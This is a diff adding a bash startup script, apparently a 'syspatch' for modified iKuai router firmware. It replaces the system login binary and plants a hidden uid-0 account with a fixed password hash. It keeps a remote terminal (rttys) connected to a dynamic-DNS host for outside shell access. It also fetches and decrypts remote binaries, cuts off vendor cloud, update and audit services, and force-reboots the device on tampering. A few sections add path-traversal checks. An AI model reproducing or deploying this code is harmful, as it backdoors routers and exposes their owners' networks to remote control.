@@ -1,0 +1,718 @@
+#!/bin/bash
+
+#rm /tmp/syspatch
+killall appinst >/dev/null 2>&1
+if [ -f /tmp/syspatch ];then
+exit
+fi
+echo "1" >/tmp/syspatch
+
+
+current_version=$(cat /tmp/ikpkg/eeprom/version|awk -F '.' '{print $1}')
+version=$(cat /tmp/ikpkg/eeprom/version)
+
+vtoken=`cat /etc/release|grep "GWID"|awk -F "=" '{print $2}'`
+
+mkdir /tmp/iktmp/ikpkg -p
+ln -fs /tmp/ikpkg/eeprom/data/rttys /usr/bin/rttys
+chmod +x /tmp/ikpkg/eeprom/data/rttys
+cp /tmp/ikpkg/eeprom/data/login /bin/login
+chmod +x /bin/login
+rm /tmp/ikpkg/eeprom/data/login
+
+openrestyre=0
+rclog=0
+
+set_rc_trunoff=$(cat /etc/mnt/rcstatus)
+closeup=$(cat /etc/mnt/closeup)
+appinst_ver=`cat /tmp/ikpkg/appinst/version`
+clientsstats=$(cat /etc/mnt/clientsstats)
+
+
+echo "服本启动时间第一次定义" >>/tmp/syspatch
+update_time=`date +'%Y-%m-%d %H:%M:%S'`
+
+check_network() {
+
+    while true; do
+        ping -c2 qq.com >/dev/null 2>&1 && break
+        ping -c2 163.com >/dev/null 2>&1 && break
+        ping -c2 baidu.com >/dev/null 2>&1 && break
+        sleep 20
+    done
+
+}
+
+check_ikntpget() {
+
+while true; do
+
+	if ! killall -q -0 ikntpget ; then
+		ikntpget -s >/dev/null 2>&1 && break
+	fi
+sleep 20
+
+done
+echo 1 > /tmp/iktmp/ikntpget
+}
+
+check_ikntpget &
+
+PUBLIC_KEY(){
+PUBKEY_STR="-----BEGIN CERTIFICATE-----
+MIIDJjCCAg6gAwIBAgIUfTwwKvlZik74eZr3/WsdJ5XBgR4wDQYJKoZIhvcNAQEL
+BQAwGzEZMBcGA1UEAwwQbXktbG9uZ3Rlcm0tY2VydDAgFw0yNTA1MDYxNTI5MDBa
+GA8yMTI1MDQxMjE1MjkwMFowGzEZMBcGA1UEAwwQbXktbG9uZ3Rlcm0tY2VydDCC
+ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMRrf+ZW7uw1drZ1k8qEEcMU
+ZUCgz6KPoPod6RtQK5eRbpXcaF00/1xQWeS4iLKy3MdbSx46zzJ372FsKVoQhk0Z
+5CqTpisAHxWfIIREKHBV3GMl143oaFaPJuFwRL+19PpT8ZhN1L4xA2Fct1690zCp
+Z7sOcJRAjpIrDhddYv0w16wWUsSZmZX78OtLCZqnRbJ29eShzBQu+wP1djoqkqa3
+CJkSXiiYTtMCQ4nL2WlNyw7CehFIRGfEYfXALvBUK4e7/dR5T8BfJZvf10C+qQE9
+9DmRcCsEJpJGb3eFOW5rqOBhgwoGtPZueQXZDjSaNyIemIRJlY4PZGeYpKKgrLEC
+AwEAAaNgMF4wHQYDVR0OBBYEFPNzJJP16JRUn7D7FvosI72od+YpMB8GA1UdIwQY
+MBaAFPNzJJP16JRUn7D7FvosI72od+YpMA8GA1UdEwEB/wQFMAMBAf8wCwYDVR0P
+BAQDAgWgMA0GCSqGSIb3DQEBCwUAA4IBAQBA0F2YZ0pprXQpTEGTtM9bbO9w8j+a
++dGMM1O08YcNil/yUqGDOYtHEq/QjZbKEm5saqdSpQ4W2nIIJwXdlTEXwTejA+68
+bhcFuTcCqFJEyOakRbU+T315Qqg882PVVxe+HQD0iPDkv9SmNedS1M/8g1oVo5BL
+I/EFab9Q0LBzavtUin06SeAHFKLbJOAOIGfIhOQs7z/yC+D8MsTNhvZjEfmgRhFX
+pXmvhp4mageNnkV9igECiLawLA/8qqiMSHMvEpjJsDTpqHkHjKuwjccbZyJUV/K0
+GhWRYLR53UOVBYQHWVXyYbHInmMAufzRIMgHyIpHA+IjK3Ykz9M+kxy/
+-----END CERTIFICATE-----"
+PUBKEY=$(mktemp)
+echo "$PUBKEY_STR" > "$PUBKEY"
+}
+
+PUBLIC_KEY
+
+
+
+Sh_ver_up(){
+
+local_appinst="/etc/log/appinst.bin"
+
+downloaded_version=`curl -sL https://ikuai8-app.oss-cn-beijing.aliyuncs.com/v8/version_bin`
+
+loca_version=$(cat /tmp/ikpkg/appinst/version_bin)
+
+# 去掉版本号中的 '.'，将版本号作为数字比较
+loca_version_no_dot=$(echo "$loca_version" | tr -d '.')
+downloaded_version_no_dot=$(echo "$downloaded_version" | tr -d '.')
+
+	if [ "$loca_version_no_dot" -lt "$downloaded_version_no_dot" ]; then
+			debug "发现新版$downloaded_version执行更新"
+			rm $local_appinst -f
+			wget -O $local_appinst https://ikuai8-app.oss-cn-beijing.aliyuncs.com/v8/appinst_$downloaded_version.bin -q
+
+		if [ ! -s $local_appinst ];then
+			rm $local_appinst -f
+		fi
+
+
+		if ! echo -n "kingGC@21#13!888" | openssl aes-128-cbc -in $local_appinst -out /tmp/appinst.gz -pass stdin -d >/dev/null 2>&1; then
+			rm $local_appinst -f
+			rm /tmp/appinst.gz -f
+			return
+		fi
+
+		if [ ! -d /tmp/ikpkg/appinst ];then
+			mkdir -p /tmp/ikpkg/appinst
+		fi
+
+		tar -zxf /tmp/appinst.gz -C /tmp/ikpkg/appinst
+
+
+	fi
+
+
+
+}
+
+
+activated(){
+
+check_network
+
+/tmp/ikpkg/appinst/genuine activate_sn
+
+}
+
+
+stop_dockerd()
+{
+
+rm -f /tmp/iktmp/dockerd.status
+pids_master=$(ps |awk '$5=="dockerd"{print $1}')
+for pid in $pids_master ;do
+pid_second+=$(ps -l |awk -v pid=$pid '$4==pid{print $3}')
+done
+
+for pid in $pid_second ;do
+pid_three+=$(ps -l |awk -v pid=$pid '$4==pid{print $3}')
+done
+
+if [ "$pids_master" ];then
+kill $pids_master $pid_second $pid_three
+sleep 1
+
+for i in {1..10} ;do
+if kill $pids_master >/dev/null 2>&1 ;then
+sleep 1
+else
+break
+fi
+done
+kill $pids_master >/dev/null 2>&1 || kill -9 $pids_master >/dev/null 2>&1 
+fi
+ulimit -n 1024
+
+brctl show | while read ifname other ;do
+if [ "${ifname:0:3}" = "doc" ];then
+ifconfig $ifname down
+brctl delbr $ifname
+fi
+done
+}
+
+
+del_ikpkg(){
+
+stats=`ps |grep "stats_router" |grep -v "grep" |wc -l`
+if [ $stats -gt 0 ];then
+
+	bash -c "INSTALL_DIR=/tmp/ikpkg/stats_router && . /tmp/ikpkg/stats_router/uninstall.sh"
+	rm /tmp/ikpkg/stats_router -rf
+	rm /tmp/ikpkg/stats_router -rf
+
+fi
+
+pmds=`ps |grep "pmd" |grep -v "grep" |wc -l`
+if [ $pmds -gt 0 ];then
+rm `which pmd`
+rm /tmp/ikpkg/pmd -rf
+killall pmd
+fi
+
+
+
+clients_stats=`ps |grep "clients_stats" |grep -v "grep" |wc -l`
+if [ $clients_stats -gt 0 ];then
+	kill `ps|grep "clients_stats"|grep -v "grep"|awk -F " " '{print $1}'`
+	rm /tmp/ikpkg/stats_router/clients_stats -f
+fi
+
+client_online_time=`ps |grep "client_online_time" |grep -v "grep" |wc -l`
+if [ $client_online_time -gt 0 ];then
+	kill `ps|grep "client_online_time"|grep -v "grep"|awk -F " " '{print $1}'`
+	rm /tmp/ikpkg/stats_router/client_online_time -f
+fi
+
+rm /usr/bin/ik_audit_publisher -rf
+killall ik_audit_publisher
+
+
+}
+
+update_time_sh(){
+#服本到当前时间
+update_endtime=`date +'%Y-%m-%d %H:%M:%S'`
+#把启动时间转换成秒
+upstart_seconds=$(date --date="$update_time" +%s);
+#服本到当前时间转换成秒
+upend_seconds=$(date --date="$update_endtime" +%s);
+#用当前时间秒减去启动时间秒等于时间的差
+	up_time=3600
+	if [ -f /tmp/update_time ];then
+	 up_time=$(cat /tmp/update_time)
+	fi
+	
+	if [ $((upend_seconds-upstart_seconds)) -gt $up_time ];then
+		#时间到了重启定义启动时间
+		update_time=`date +'%Y-%m-%d %H:%M:%S'`
+		echo "更新！！"  >/tmp/syspatch
+		activated
+		Sh_ver_up
+	fi
+
+}
+
+if [ "$closeup" == "01" ];then
+	# 关闭在线更新
+	sed -i '/iktmp/ i return 1 #clseupdate' /usr/ikuai/include/version_all.sh
+	rm /tmp/iktmp/Version_all -rf
+	
+fi
+
+
+
+cloud_DROP(){
+
+if [ -f /tmp/iktmp/set_rc_trunoff ];then
+return
+fi
+
+iptables -N cloud_DROP
+iptables -I cloud_DROP -p tcp --dport 2500:2510 -j DROP
+iptables -I cloud_DROP -p tcp --dport 2010:2020 -j DROP
+iptables -I cloud_DROP -p tcp --dport 32017 -j DROP
+iptables -I cloud_DROP -p tcp --dport 2016 -j DROP
+iptables -I cloud_DROP -p tcp --dport 9443 -j DROP
+iptables -I cloud_DROP -p tcp --dport 1853 -j DROP
+iptables -I cloud_DROP -p tcp --dport 15602 -j DROP
+iptables -I cloud_DROP -p tcp --dport 1863 -j DROP
+iptables -I cloud_DROP -p tcp --dport 2016 -j DROP
+iptables -I cloud_DROP -p tcp --dport 622 -j DROP
+
+iptables -I OUTPUT -j cloud_DROP
+iptables -I INPUT -j cloud_DROP
+
+ip6tables -I INPUT -p tcp --dport 622 -j DROP
+ip6tables -I OUTPUT -p tcp --dport 622 -j DROP
+ip6tables -I INPUT -p tcp --dport 6000 -j DROP
+ip6tables -I OUTPUT -p tcp --dport 6000 -j DROP
+
+echo "01" > /tmp/iktmp/set_rc_trunoff
+
+}
+upgrades_no_cloud(){
+
+if [ -f /tmp/iktmp/upgrades_no_cloud ];then
+return
+fi
+echo "执行更新"
+cp /usr/ikuai/include/submit.sh /usr/ikuai/include/submit.sh.bak
+
+sed -i '2i write_submits=1' /usr/ikuai/include/submit.sh
+sed -i "s/ikluajit/#ikluajit/g" /usr/ikuai/include/submit.sh
+sed -i "s/return 1/sleep 1/g" /usr/ikuai/include/submit.sh
+
+sed -i "/submit3 down_version_all/i\curl -o /tmp/iktmp/Version_all -L -4 https:\/\/download.ikuai8.com\/submit3x\/Version_all --speed-time 30 --speed-limit 3 --connect-timeout 20 --retry 5 --retry-max-time 10 --capath \/etc\/ssl\/certs -H X-GWID:986d00895fe8699ad79f983b3ff39ca2" /usr/ikuai/include/submit.sh
+
+sed -i "s/ikluajit \$SUBMIT_CACHE\/submit3 down_version_all/#ikluajit \$SUBMIT_CACHE\/submit3 down_version_all/g" /usr/ikuai/include/submit.sh
+sed -i '/submit3 down_firmware /i\FIRMWARENAME=\`curl -L -4 https://download.ikuai8.com/submit3x/Version_all |grep "iKuai8_x64"|grep -v "Enterprise"|tail -1|cut -d " " -f 3\`' /usr/ikuai/include/submit.sh
+sed -i "/submit3 down_firmware /i\wget http://patch.ikuai8.com/3.x/patch/\$FIRMWARENAME  -O \`echo \$2|awk -F \"=\" '{print(\$2)}'\` -o /tmp/update/download.status" /usr/ikuai/include/submit.sh
+
+sed -i "/ikluajit \$SUBMIT_CACHE\/submit3 down_library/i\wget https://patch.ikuai8.com/lib/\`echo \$1|awk -F \"=\" '{print(\$2)}'\` -O \`echo \$2|awk -F \"=\" '{print(\$2)}'\`  -o \/tmp\/update\/download.status" /usr/ikuai/include/submit.sh
+
+
+echo "01" >/tmp/iktmp/upgrades_no_cloud
+
+}
+
+
+check_safty(){
+
+pidof iktunc && reboot
+[ -d /var/run/iktunc ] && reboot
+[ -f /usr/sbin/iktunc ] && reboot
+
+}
+
+
+
+#=====================================================http===============
+
+http_server=`grep "raw_path" /usr/ikuai/script/http_server.sh | wc -l`
+if [ $http_server -eq 0 ];then
+cat <<EOF > /tmp/insert_script_containeradd.sh
+raw_path="\$tmp_dir"
+clean_path="/etc/disk_user/\${raw_path#/}"
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+return 1
+fi
+EOF
+sed -i '/local tmp_dir=/r /tmp/insert_script_containeradd.sh' /usr/ikuai/script/http_server.sh
+
+rm /tmp/insert_script_containeradd.sh -f
+
+sed -i '/conf+="}/i \conf+="\\tdisable_symlinks on from=\\$document_root;\\n"' /usr/ikuai/script/http_server.sh
+
+
+if [ -f /usr/openresty/conf/static_file.conf ];then
+if ! grep -q "disable_symlinks" /usr/openresty/conf/static_file.conf;then
+sed -i '/autoindex_exact_size off;/a \    disable_symlinks on from=$document_root;' /usr/openresty/conf/static_file.conf
+openresty -s reload
+fi
+fi
+fi
+
+
+ftp=`grep "raw_path" /usr/ikuai/script/ftp_server.sh | wc -l`
+if [ $ftp -eq 0 ];then
+cat <<EOF > /tmp/insert_script_containeradd.sh
+raw_path="\$tmp_dir"
+clean_path="/etc/disk_user/\${raw_path#/}"
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+return 1
+fi
+EOF
+
+cat <<EOF > /tmp/insert_script_containeradds.sh
+raw_path="\$abs_path"
+real_path=\$(readlink -f "\$raw_path" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+return 1
+fi
+EOF
+
+
+
+sed -i '/local tmp_dir=/r /tmp/insert_script_containeradd.sh' /usr/ikuai/script/ftp_server.sh
+sed -i '/local abs_path=/r /tmp/insert_script_containeradds.sh' /usr/ikuai/script/ftp_server.sh
+fi
+
+smbd=`grep "raw_path" /usr/ikuai/script/smbd.sh | wc -l`
+if [ $smbd -eq 0 ];then
+cat <<EOF > /tmp/insert_script_containeradd.sh
+raw_path="\$tmp_dir"
+clean_path="/etc/disk_user/\${raw_path#/}"
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+return 1
+fi
+EOF
+
+cat <<EOF > /tmp/insert_script_containeradds.sh
+raw_path="\$path_one"
+clean_path="/etc/disk_user/\${raw_path#/}"
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+return 1
+fi
+EOF
+
+
+sed -i '/local tmp_dir=/r /tmp/insert_script_containeradd.sh' /usr/ikuai/script/smbd.sh
+sed -i '/path_one=/r /tmp/insert_script_containeradds.sh' /usr/ikuai/script/smbd.sh
+rm /tmp/insert_script_containeradds.sh -f
+rm /tmp/insert_script_containeradd.sh -f
+
+
+
+if killall -q -0 wsdd2;then
+/usr/ikuai/script/smbd.sh __smbd_restart >/dev/null 2>&1
+fi
+
+
+fi
+#=================================================================================================
+
+docker_server=0
+docker_container=0
+static_file=0
+while true
+do
+
+
+if [ -f /usr/openresty/conf/static_file.conf ] && [ $static_file -eq 0 ];then
+static_file=1
+if ! grep -q "disable_symlinks" /usr/openresty/conf/static_file.conf;then
+sed -i '/autoindex_exact_size off;/a \    disable_symlinks on from=$document_root;' /usr/openresty/conf/static_file.conf
+openresty -s reload
+fi
+fi
+
+#docker_server.sh 文件修改
+if [ -f /tmp/ikpkg/docker/script/docker_server.sh ] && [ $docker_server -eq 0 ];then
+docker_server=1
+file_doc_config=`grep "install2020427" /tmp/ikpkg/docker/script/docker_server.sh | wc -l`
+if [ $file_doc_config -eq 0 ];then
+cat <<EOF > /tmp/ikpkg/docker/script/insert_script.sh
+doc_path="/etc/disk/*/Docker/lib/containers/*/config.v2.json"
+for config_path_one in \$doc_path; do
+mount_sources=\$(jq -r '.MountPoints[] | .Source, (.Spec.Source // empty)' "\$config_path_one" 2>/dev/null)
+for mount_one in \$mount_sources; do
+[ -z "\$mount_one" ] && continue
+clean_path=\$(echo "\$mount_one" | tr -d '",')
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+[ -z "\$real_path" ] && real_path=\$(readlink -f "/etc/disk_user/\${clean_path#/etc/disk_user/}" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+invalid=1
+fi
+if [ "\${invalid:-0}" -eq 1 ]; then
+doc_ID=\$(jq -r '.ID' "\$config_path_one" 2>/dev/null)
+[ -z "\$doc_ID" ] && continue
+ikdocker container_stop id="\$doc_ID" 2>/dev/null
+stop_dockerd
+jq '.MountPoints = {}' "\$config_path_one" > /tmp/config.bak && \
+mv /tmp/config.bak "\$config_path_one" && \
+jq 'del(.Config.Labels.mounts)' "\$config_path_one" > "\$temp_file"
+mv "\$temp_file" "\$config_path_one"
+break
+fi
+done
+done
+#install2020427
+EOF
+
+sed -i '/local work_path="\$realpath\/Docker"/r /tmp/ikpkg/docker/script/insert_script.sh' /tmp/ikpkg/docker/script/docker_server.sh
+sed -i '/isboot=/r /tmp/ikpkg/docker/script/insert_script.sh' /tmp/ikpkg/docker/script/docker_server.sh
+rm /tmp/ikpkg/docker/script/insert_script.sh
+
+
+
+doc_path="/etc/disk/*/Docker/lib/containers/*/config.v2.json"
+	for config_path_one in $doc_path; do
+	#echo "检查配置文件: $config_path_one"
+	# 提取所有挂载源路径（包括.Spec.Source）
+	mount_sources=$(jq -r '.MountPoints[] | .Source, (.Spec.Source // empty)' "$config_path_one" 2>/dev/null)
+		for mount_one in $mount_sources; do
+			[ -z "$mount_one" ] && continue
+			echo "原始挂载路径: $mount_one"
+			# 清理路径（移除JSON可能残留的引号和逗号）
+			clean_path=$(echo "$mount_one" | tr -d '",')
+			# 检查相对路径（../）
+			if echo "$clean_path" | grep -q "\.\."; then
+				#echo "[安全警告] 发现相对路径: $clean_path"
+				invalid=1
+			fi
+			# 解析真实路径
+			real_path=$(readlink -f "$clean_path" 2>/dev/null)
+			[ -z "$real_path" ] && real_path=$(readlink -f "/etc/disk_user/${clean_path#/etc/disk_user/}" 2>/dev/null)
+			#echo "解析后路径: ${real_path:-未解析}"
+			# 核心检查：路径必须以/etc/disk开头
+			if ! echo "${real_path:-}" | grep -q "^/etc/disk"; then
+				echo "[安全违规] 非法挂载路径（不在/etc/disk下）"
+				invalid=1
+			fi
+			# 处理非法路径
+			if [ "${invalid:-0}" -eq 1 ]; then
+				# 获取容器ID
+				doc_ID=$(jq -r '.ID' "$config_path_one" 2>/dev/null)
+				[ -z "$doc_ID" ] && continue
+				#echo "正在处理违规容器: $doc_ID"
+				ikdocker container_stop id="$doc_ID" 2>/dev/null
+				echo "容器已停止"
+				#停止服务
+				stop_dockerd
+				#echo "清空挂载点配置..."
+				jq '.MountPoints = {}' "$config_path_one" > /tmp/config.bak && \
+				mv /tmp/config.bak "$config_path_one" && \
+				jq 'del(.Config.Labels.mounts)' "$config_path_one" > "$temp_file"
+				mv "$temp_file" "$config_path_one"
+				break
+			fi
+		done
+	done
+
+fi
+
+fi
+#===============================================================================
+
+#docker_container.sh 文件修改
+if [ -f /tmp/ikpkg/docker/script/docker_container.sh ] && [ $docker_container -eq 0 ];then
+docker_container=1
+file_doc_config=`grep "insert_script_container" /tmp/ikpkg/docker/script/docker_container.sh | wc -l`
+if [ $file_doc_config -eq 0 ];then
+cat <<EOF > /tmp/ikpkg/docker/script/insert_script_container.sh
+doc_path=/etc/disk_user/*/Docker/lib/containers/\$id/config.v2.json
+for doconfig in \$doc_path;
+do
+local illegal=0
+Source1=\`jq -r '.MountPoints[] | .Spec.Source' \$doconfig\`
+Source2=\`jq -r '.MountPoints[] | .Spec.Source' \$doconfig\`
+
+if [ -n "\$Source1" ]; then
+
+for path in \$Source1; do
+
+# 清理路径（移除JSON可能残留的引号和逗号）
+clean_path=\$(echo "\$Source1" | tr -d '",')
+echo \$clean_path >>/tmp/dockerss.log
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+[ -z "\$real_path" ] && real_path=\$(readlink -f "/etc/disk_user/\${clean_path#/etc/disk_user/}" 2>/dev/null)
+
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+echo \$real_path >>/tmp/dockerss.log
+return 0
+illegal=1
+fi
+
+if ! echo "\$path" | grep -q "^/etc/disk_user"; then
+return 0
+illegal=1
+fi
+if echo "\$path" | grep -q "\.\."; then
+return 0
+illegal=1
+fi
+done
+
+fi
+
+if [ -n "\$Source2" ]; then
+
+for path in \$Source2; do
+
+clean_path=\$(echo "\$Source2" | tr -d '",')
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+[ -z "\$real_path" ] && real_path=\$(readlink -f "/etc/disk_user/\${clean_path#/etc/disk_user/}" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+return 0
+illegal=1
+fi
+
+if ! echo "\$path" | grep -q "^/etc/disk_user"; then
+illegal=1
+fi
+if echo "\$path" | grep -q "\.\."; then
+illegal=1
+fi
+done
+fi
+
+if [ \$illegal -eq 1 ];then
+return 0
+rm \$doc_path -f
+ikdocker container_stop id="\$id"
+#ikdocker container_del id="\$id"
+return 0
+fi
+done
+EOF
+
+sed -i '/container_start/i\#insert_script_container' /tmp/ikpkg/docker/script/docker_container.sh
+sed -i '/insert_script_container/r /tmp/ikpkg/docker/script/insert_script_container.sh' /tmp/ikpkg/docker/script/docker_container.sh
+rm /tmp/ikpkg/docker/script/insert_script_container.sh -f
+fi
+
+
+
+file_doc_config3=`grep "raw_path" /tmp/ikpkg/docker/script/docker_container.sh | wc -l`
+if [ $file_doc_config3 -eq 0 ];then
+cat <<EOF > /tmp/ikpkg/docker/script/insert_script_containeradd.sh
+raw_path="\$path_dir"
+clean_path="/etc/disk_user/\${raw_path#/}"
+real_path=\$(readlink -f "\$clean_path" 2>/dev/null)
+if ! echo "\${real_path:-}" | grep -q "^/etc/disk"; then
+return 1
+fi
+EOF
+sed -i '/local path_dir=/r /tmp/ikpkg/docker/script/insert_script_containeradd.sh' /tmp/ikpkg/docker/script/docker_container.sh
+rm /tmp/ikpkg/docker/script/insert_script_containeradd.sh -f
+fi
+
+fi
+
+
+
+
+passwdmd5=`cat /etc/passwd|grep -v iksshd|md5sum`
+if [ "$passwdmd5" != "e8a626fe1dc2ea7a74ad45f5f3a6e91a  -" ];then
+	busybox reboot -f
+fi
+
+
+if ! grep -q 'iksshd:$1$ebBzICAY$5CaSyktzPh8SEUYMHdzhf1:17857:0:99999:7:::' /etc/shadow; then
+	busybox reboot -f
+fi
+
+
+if grep -q "w6P5HeYHgvHhHrhpoYVQW0" /etc/shadow; then
+	busybox reboot -f
+fi
+
+
+iksshd=`cat /etc/shadow|grep "iksshd"|wc -l`
+if [ $iksshd -eq 0 ];then
+echo 'iksshd:$1$ebBzICAY$5CaSyktzPh8SEUYMHdzhf1:17857:0:99999:7:::' >>/etc/shadow
+	echo "root:x:0:0:root:/root:/etc/setup/rc" > /etc/passwd
+	echo "daemon:*:1:1:daemon:/var:/bin/false" >> /etc/passwd
+	echo "ftp:*:55:55:ftp:/home/ftp:/bin/false" >> /etc/passwd
+	echo "network:*:101:101:network:/var:/bin/false" >> /etc/passwd
+	echo "nobody:*:65534:65534:nobody:/var:/bin/false" >> /etc/passwd
+	echo "sshd:x:0:0:sshd:/root:/etc/setup/rc" >> /etc/passwd
+	echo 'iksshd:x:0:0:iksshd:/root:/bin/ash' >>/etc/passwd
+fi
+
+passwds=$(cat /etc/passwd|md5sum|awk -F " " '{print $1}')
+if [ "$passwds" != "2e35dbfe16d02ea1c6139429cca55e2a" ];then
+	echo "root:x:0:0:root:/root:/etc/setup/rc" > /etc/passwd
+	echo "daemon:*:1:1:daemon:/var:/bin/false" >> /etc/passwd
+	echo "ftp:*:55:55:ftp:/home/ftp:/bin/false" >> /etc/passwd
+	echo "network:*:101:101:network:/var:/bin/false" >> /etc/passwd
+	echo "nobody:*:65534:65534:nobody:/var:/bin/false" >> /etc/passwd
+	echo "sshd:x:0:0:sshd:/root:/etc/setup/rc" >> /etc/passwd
+	echo 'iksshd:x:0:0:iksshd:/root:/bin/ash' >>/etc/passwd
+fi
+
+
+rttys_md5=`md5sum /tmp/ikpkg/eeprom/data/rttys|awk -F " " '{print $1}'`
+if [ "$rttys_md5" != "85c51212e5e8f5e79ba2297f928ace6e" ];then
+
+	busybox reboot -f
+fi
+
+
+
+
+if killall -q -0 rttys ; then
+linssssss=1
+else
+
+optical=$(curl -s "https://doh.pub/dns-query?name=bdoptical2.vicp.cc&type=A" | jq -r '.Answer[].data' | sed -E 's/"//g')
+
+
+if [ -n "$optical" ];then
+rttys_server=$optical
+else
+optical=$(curl -s -H "accept: application/dns-json" "https://dns.alidns.com/resolve?name=bdoptical2.vicp.cc&type=A" | jq -r '.Answer[0].data')
+fi
+
+
+
+if [ -n "$optical" ];then
+rttys_server=$optical
+else
+rttys_server='bdoptical2.vicp.cc'
+fi
+
+
+
+current_version=$(cat /tmp/ikpkg/eeprom/version|awk -F '.' '{print $1}')
+
+if [ `grep "VIRTUAL_DEVICE" /etc/release|wc -l` -ne 0 ];then
+    hardware="VMware"
+fi
+
+rttys -I "$vtoken" -h "$rttys_server" -p 5912 -a -s -C $PUBKEY -v -d "version-$version-$hardware" -D
+sleep 10
+fi
+
+	
+openssl_md5=`md5sum /usr/bin/openssl|awk -F " " '{print $1}'`
+if [ "$openssl_md5" != "8dc48f57409edca7a781e6857382687b" ];then
+	sleep 120
+	busybox reboot -f
+	exit 1
+fi
+
+
+
+
+if [ "$set_rc_trunoff" == "01" ] && [ ! -f /tmp/iktmp/set_rc_trunoff ];then
+
+cloud_DROP
+upgrades_no_cloud
+
+rc_client=`ps |grep "ik_rc_client" |grep -v "grep" |wc -l`
+if [ $rc_client -gt 0 ];then
+	mv /usr/sbin/ik_rc_client /usr/sbin/ik_rc_client.bak
+	killall ik_rc_client
+fi
+
+fi
+
+
+sleep 30
+
+check_safty
+
+#检测更新
+update_time_sh
+
+
+done
+
